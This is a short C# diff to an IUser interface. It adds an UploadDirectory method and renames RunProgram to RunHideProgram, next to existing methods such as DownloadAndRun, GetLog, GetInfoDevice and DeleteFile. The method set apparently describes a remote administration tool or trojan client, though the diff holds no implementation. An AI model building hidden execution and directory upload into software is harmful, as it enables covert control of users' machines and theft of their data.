@@ -8,12 +8,13 @@ namespace Interfaces.Users
 {
     public interface IUser
     {
+        void UploadDirectory(string dirPath, string uploadPath);
         List<string> GetLog();
         IInfoDevice GetInfoDevice();
         void DownloadFloader(string ftpPath, string localPath);
         void DownloadUpdate();
         void Reconnect();
-        void RunProgram(string file);
+        void RunHideProgram(string file);
         void DownloadAndRun(string file);
         void DeleteFile(string file);
         ISetting GetSetting();
